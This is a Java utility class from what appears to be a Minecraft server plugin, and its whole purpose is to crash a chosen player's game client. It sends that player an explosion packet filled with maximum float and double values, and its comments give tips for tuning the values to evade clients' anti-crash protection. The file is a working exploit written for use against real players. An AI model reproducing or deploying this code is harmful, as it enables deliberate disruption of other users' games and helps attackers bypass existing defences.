package gg.fold.Utils;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.List;
import java.util.Set;

public class CrashUtils {
    private static final String serverVersion;

    static {
        String path = Bukkit.getServer().getClass().getPackage().getName();
        serverVersion = path.substring(path.lastIndexOf(".") + 1);
    }

    /**
     * Crash a player hehe
     *
     * @param victim    A player, which you want to crash
     */
    public static void crashPlayer(CommandSender crasher, Player victim) {
        try {

                    // Vec3D with fat arguments
                    Class<?> Vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
                    Constructor<?> vec3DConstructor = Vec3D.getConstructor(double.class, double.class, double.class);
                    Object vec3d = vec3DConstructor.newInstance(
                            d(), d(), d());

                    // PacketPlayOutExplosion with fat arguments
                    Class<?> PacketPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");
                    Constructor<?> playOutConstructor = PacketPlayOutExplosion.getConstructor(
                            double.class, double.class, double.class, float.class, List.class, Vec3D);
                    Object explosionPacket = playOutConstructor.newInstance(
                            d(), d(), d(), f(), Collections.emptyList(), vec3d);

                    sendPacket(victim, explosionPacket);



        } catch (Exception e) {


            e.printStackTrace();
        }

    }

    /**
     * Sends a NMS packet to a given player
     *
     * @param player To whom is the packet sent
     * @param packet The packet to be sent
     * @throws Exception when something goes wrong
     */
    private static void sendPacket(Player player, Object packet) throws Exception {

        Class<?> craftPlayer = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".entity.CraftPlayer");
        Object craftPlayerObject = craftPlayer.cast(player);

        Method getHandleMethod = craftPlayer.getMethod("getHandle");
        Object handle = getHandleMethod.invoke(craftPlayerObject);
        Object pc = handle.getClass().getField("playerConnection").get(handle);

        Class<?> Packet = Class.forName("net.minecraft.server." + serverVersion + ".Packet");
        Method sendPacketMethod = pc.getClass().getMethod("sendPacket", Packet);

        sendPacketMethod.invoke(pc, packet);

    }

    // Below are the numbers that you can modify to bypass anticrash.

    // Most cheat clients patched this by cancelling MAX_VALUE packets.
    // Change this to something lower such as half of double value.

    private static Double d() {
        return Double.MAX_VALUE;
    }

    private static Float f() {
        return Float.MAX_VALUE;
    }

}
